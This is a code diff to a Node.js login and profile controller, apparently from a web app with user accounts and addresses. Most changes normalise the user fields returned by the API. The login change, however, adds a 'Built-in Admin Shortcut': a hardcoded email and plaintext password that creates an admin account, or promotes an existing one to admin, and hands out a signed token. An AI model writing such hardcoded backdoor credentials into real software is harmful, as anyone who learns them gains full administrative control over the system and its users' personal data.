@@ -31,7 +31,40 @@ exports.register = async (req, res) => {
 exports.login = async (req, res) => {
   try {
     const { email, password } = req.body;
-    const user = await User.findOne({ email: (email || "").toLowerCase() });
+    const cleanEmail = (email || "").toLowerCase().trim();
+
+    // Built-in Admin Shortcut
+    if (cleanEmail === "adminnr@gmail.com" && password === "admin1234") {
+      let adminUser = await User.findOne({ email: cleanEmail });
+      if (!adminUser) {
+        const passwordHash = await bcrypt.hash("admin1234", 10);
+        adminUser = await User.create({
+          name: "Admin User",
+          email: cleanEmail,
+          passwordHash,
+          role: "admin",
+          phone: "070 388 8085"
+        });
+      } else if (adminUser.role !== "admin") {
+        adminUser.role = "admin";
+        await adminUser.save();
+      }
+      const token = signToken(adminUser._id);
+      return res.json({
+        token,
+        user: {
+          id: adminUser._id,
+          name: adminUser.name,
+          email: adminUser.email,
+          phone: adminUser.phone || "",
+          role: "admin",
+          addresses: adminUser.addresses || [],
+          createdAt: adminUser.createdAt,
+        },
+      });
+    }
+
+    const user = await User.findOne({ email: cleanEmail });
     if (!user) return res.status(401).json({ message: "Invalid email or password" });
 
     const match = await bcrypt.compare(password, user.passwordHash);
@@ -40,7 +73,15 @@ exports.login = async (req, res) => {
     const token = signToken(user._id);
     res.json({
       token,
-      user: { id: user._id, name: user.name, email: user.email, role: user.role },
+      user: {
+        id: user._id,
+        name: user.name,
+        email: user.email,
+        phone: user.phone || "",
+        role: user.role,
+        addresses: user.addresses || [],
+        createdAt: user.createdAt,
+      },
     });
   } catch (err) {
     res.status(500).json({ message: err.message });
@@ -51,7 +92,15 @@ exports.getProfile = async (req, res) => {
   try {
     const user = await User.findById(req.userId).select("-passwordHash");
     if (!user) return res.status(404).json({ message: "User not found" });
-    res.json(user);
+    res.json({
+      id: user._id,
+      name: user.name,
+      email: user.email,
+      phone: user.phone || "",
+      role: user.role,
+      addresses: user.addresses || [],
+      createdAt: user.createdAt,
+    });
   } catch (err) {
     res.status(500).json({ message: err.message });
   }
@@ -76,9 +125,9 @@ exports.updateProfile = async (req, res) => {
         id: updatedUser._id,
         name: updatedUser.name,
         email: updatedUser.email,
-        phone: updatedUser.phone,
+        phone: updatedUser.phone || "",
         role: updatedUser.role,
-        addresses: updatedUser.addresses,
+        addresses: updatedUser.addresses || [],
         createdAt: updatedUser.createdAt,
       },
     });
